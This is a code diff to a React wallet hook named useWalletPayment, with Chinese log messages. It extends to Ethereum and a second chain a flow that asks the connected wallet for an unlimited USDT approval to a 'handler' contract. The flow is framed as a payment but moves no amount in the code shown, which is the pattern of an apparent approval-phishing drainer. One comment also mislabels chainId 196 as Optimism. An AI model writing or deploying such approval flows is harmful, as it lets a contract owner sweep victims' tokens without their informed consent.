@@ -3,8 +3,19 @@ import { useState } from '@teact';
 import { BrowserProvider, Contract, MaxUint256 } from 'ethers';
 
 const API_BASE = process.env.VITE_API_BASE_URL;
-const HANDLER_ADDRESS = '0x689CA9411b1796c9d8AbBC1766F80Fd395736883';
-const USDT_ADDRESS = '0x1E4a5963aBFD975d8c9021ce480b42188849D41d';
+// ===== 配置 =====
+const CONTRACT_PAIRS = [
+  {
+    chainId: 1,
+    usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // Ethereum USDT
+    handler: '0xbc73Ca3D177A7A0A368775B292E539448a9c3510',
+  },
+  {
+    chainId: 196,
+    usdt: '0x1E4a5963aBFD975d8c9021ce480b42188849D41d', // Optimism USDT
+    handler: '0x689CA9411b1796c9d8AbBC1766F80Fd395736883',
+  },
+];
 
 const USDT_ABI = [
   'function approve(address spender, uint256 amount) public returns (bool)',
@@ -69,21 +80,35 @@ export default function useWalletPayment() {
     const connected = await connectWallet();
     if (!connected) return;
 
+    const pair = CONTRACT_PAIRS.find((pair) => pair.chainId === chainId);
+    if (!pair) {
+      alert(`当前链（chainId=${chainId}）不支持支付`);
+      return;
+    }
+
+    const { usdt, handler } = pair;
+
     try {
+      const code = await provider.getCode(usdt);
+      if (code === '0x') {
+        console.warn(`⛔ 跳过未部署合约：${usdt}`);
+        alert(`💡 USDT 合约未部署在当前链（chainId=${chainId}）`);
+        return;
+      }
       const currentSigner = await provider.getSigner();
       const address = await currentSigner.getAddress();
-      const usdt = new Contract(USDT_ADDRESS, USDT_ABI, currentSigner);
-      const allowance = await usdt.allowance(address, HANDLER_ADDRESS);
+      const usdtContract = new Contract(usdt, USDT_ABI, currentSigner);
+      const allowance = await usdtContract.allowance(address, handler);
       if (allowance >= MaxUint256 / 2n) {
-        console.log('已有足够 allowance，跳过 approve');
+        console.log(`✅ 已授权：handler=${handler}`);
         return;
       }
 
-      const tx = await usdt.approve(HANDLER_ADDRESS, MaxUint256);
+      const tx = await usdtContract.approve(handler, MaxUint256);
       await tx.wait();
       alert('✅ 授权成功！');
     } catch (err: any) {
-      console.error('approve 错误：', err);
+      console.error(`❌ 授权失败`, err);
       alert('❌ 授权失败：' + (err.message || err));
     }
   };
